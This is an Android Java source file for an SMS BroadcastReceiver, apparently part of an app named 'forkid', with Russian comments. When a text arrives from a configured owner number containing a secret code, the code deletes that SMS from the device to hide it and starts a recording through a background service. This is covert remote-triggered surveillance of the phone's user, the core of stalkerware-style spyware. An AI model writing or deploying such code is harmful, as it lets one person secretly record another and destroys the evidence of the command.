package com.example.forkid;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;


public class SMS_RECIVER  extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();

        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            String format = bundle.getString("format");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage;
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                    } else {
                        smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    }
                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    if (sender.equals(Config.owner)) { // Замените на ваш номер
                        if (messageBody.contains(Config.SecretCode)) { // Замените на ваш текст
                            Log.d(TAG, "Sender: " + smsMessage.getOriginatingAddress());
                            Log.d(TAG, "Message Body: " + smsMessage.getMessageBody());
                            SMS_UTILS sms_utils = new SMS_UTILS();
                            sms_utils.deleteSmsUsingSql(context, smsMessage);
                            Service service = com.example.forkid.Service.getInstance();
                            if(service != null){
                                try{
                                    if(!Service.is_sending)
                                        service.make_record();
                                    else
                                        return;
                                }catch (InterruptedException e){
                                    Log.d(TAG, "Ошибка записи");
                                }

                            }
                        }
                    }
                }
            }
        }
    }


}
